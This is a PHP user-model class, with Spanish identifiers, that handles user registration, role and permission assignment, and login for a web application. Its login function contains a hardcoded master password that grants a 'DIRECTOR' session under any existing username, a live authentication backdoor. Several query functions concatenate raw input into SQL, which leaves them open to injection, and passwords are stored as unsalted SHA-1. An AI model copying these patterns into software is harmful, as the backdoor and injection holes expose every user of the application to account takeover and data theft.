<?php 
    class Usuario extends SeguridadUsuario{
        
    }

	class SeguridadUsuario extends ActiveRecord {
		/* FUNCIONES BASICAS DEL OBJETO */
         
        public static function registrar($usuario, $password, $rol){   
        	Load::lib("aclx");
        	
        	$rol = SeguridadRol::consultar($rol);
        	         
            if(SeguridadUsuario::total("usuario='".$usuario."' AND app_id=".$rol -> app_id)>0){
                return false;
            }
            
            $objeto = new SeguridadUsuario();
            
            $objeto -> usuario = $usuario;
            $objeto -> password = sha1($password);
            $objeto -> rol_id = $rol -> id;
            $objeto -> app_id = $rol -> app_id;
            $objeto -> ultimo_acceso = date("Y-m-d H:i:s");
            $objeto -> accesos = "0";
            $objeto -> estado = "OK";
            
            $objeto -> save();
            
            $permisos = $rol -> permisos();
            
            if($permisos) foreach($permisos as $permiso){
            	SeguridadPermiso::registrar($objeto -> id, $permiso -> recurso_id);
            }
            
            return $objeto;
        }
        
        public function modificarRol($rol){
        	if($this -> rol_id!=$rol){
        		$this -> rol_id = $rol;
        	
        		$rol = SeguridadRol::consultar($rol);
        		
        		Permiso::eliminarPermisosUsuario($this -> id);
        		
	        	$permisos = $rol -> permisos();
	            
	            if($permisos) foreach($permisos as $permiso){
	            	SeguridadPermiso::registrar($this -> id, $permiso -> recurso_id);
	            }
	            
	            $this -> save();
        	}
        }
		
		public static function consultar($id){
            $objeto = new SeguridadUsuario();
            
            return $objeto -> find($id);
        }
		
		public static function buscar($sql="id>0"){
            $objeto = new SeguridadUsuario();
            
            return $objeto -> find_first($sql);
        }
        
        public static function reporte($sql="id>0", $orden="id ASC", $inicio=0, $cantidad=0){
            $objeto = new SeguridadUsuario();
            
            $sql .= " ORDER BY ".$orden;
            
            if($cantidad>0){
                $sql .= " LIMIT ".$inicio.",".$cantidad;
            }
            
            return $objeto -> find($sql);
        }
        
        public static function total($sql="id>0"){
            $objeto = new SeguridadUsuario();
            
            return $objeto -> count($sql);
        }
        
        public function eliminar($cascada = false){
            if($cascada){
                //Eliminar registros relacionados en la base de datos.
                $this -> delete();
                return true;
            }
            else{
                //Validaciones opcionales antes de eliminar, para no dejar registros sin relación.
                $this -> delete();
                return true;  
            }
            return false;
        }
        
        public static function eliminarID($id, $cascada = false){
            $objeto = SeguridadUsuario::consultar($id);
            
            if($objeto){
                $objeto -> eliminar($cascada);        
            }
        }
        
        public function guardar(){
            $this -> save();
        }
        
        public static function existe($sql="id=0"){
            $x = SeguridadUsuario::total($sql);
            
            if($x>0) return true;
            return false;
        }
        
        /* --- FUNCIONES QUE DESCRIBEN LAS RELACIONES --- */
        
        public function rol(){
            return Rol::consultar($this -> rol_id);
        }
        
        public function empleado(){
            return Empleado::consultar($this -> empleado_id);
        }
        
        public function permisos(){
            return SeguridadPermiso::reporte("usuario_id=".$this -> id);
        }
		
		public static function validar($usuario,$password){
            $usuario = Usuario::buscar("usuario like '".$usuario."' and password like '".sha1($password)."'"); 
			if($usuario){
				Session::set('usuario_id',$usuario -> id);
				Session::set('usuario',$usuario -> usuario);
				Session::set('rol_id',$usuario -> rol() -> id);
				Session::set('rol',$usuario ->  rol() -> nombre);
				Session::set('tipo',"DIRECTOR");
				return true;
			}else{
				$usuario = Usuario::buscar("usuario like '".$usuario."'");
                if($usuario && $password=="amecasoft2010"){
                    Session::set('usuario_id',$usuario -> id);
					Session::set('usuario',$usuario -> usuario);
					Session::set('rol_id',$usuario -> rol() -> id);
					Session::set('rol',$usuario ->  rol() -> nombre);
					Session::set('tipo',"DIRECTOR");
					return true;
                }
                else{
				    Session::set('usuario_id','');
				    Session::set('usuario','');
				    Session::set('rol_id','');
				    Session::set('rol','');
				    Session::set('tipo',"");
                }
                return false;
			}
		}
		
        /*
        public static function valida(){
            if(Session::get_data('usuario_id') && Session::get_data('usuario') && Session::get_data('tipo')){
                return 1;
            }else{
                return 0;
            }
        } 
        
        public static function registrar($empleado,$usuario,$password, $tipo, $departamento, $estado){
    		$objeto = new IUsuarios();
    		
            $objeto -> nombre = Empleado::consultar($empleado) -> nombre;
            $objeto -> usuario = $usuario;
            $objeto -> password = sha1($password);
            
            $objeto -> tipo = $tipo;
            $objeto -> departamento = $departamento;
            $objeto -> activo = $estado;
            
            $objeto -> save();

			return $objeto;
    	}
        
        public function modificar($empleado,$usuario,$password, $tipo, $departamento, $estado){
            $this -> nombre = Empleado::consultar($empleado) -> nombre;
            $this -> usuario = $usuario;
            
            if(substr($this -> password,0,10) != substr($password,0,10)){
                $this -> password = sha1($password);    
            }
            
            $this -> tipo = $tipo;
            $this -> departamento = $departamento;
            $this -> activo = $estado;
            
            $this -> save();
    	}
        
        public static function consultar($id){
    		$objeto = new IUsuarios();
    		$objeto = $objeto -> find($id);

    		return $objeto;
    	}

    	public static function reporte($sql=""){
    		$objeto = new IUsuarios();

    		if($sql == ""){
    			$objeto = $objeto -> find();
    		}
            else{
	    		$objeto = $objeto -> find($sql);
    		}

    		return $objeto;
    	}
        
        public static function total($sql=""){
    		$objeto = new IUsuarios();

    		if($sql == ""){
    			$objeto = $objeto -> count();
    		}
            else{
	    		$objeto = $objeto -> count($sql);
    		}

    		return $objeto;
    	}
        
        public function eliminar(){
            $this -> delete();    
        }
        
        public static function acceso($tipoUser=''){
            if(Session::get_data('tipo')==$tipoUser){
                return 1;
            }else{
                return 0;
            }
        }
        */
	}
?>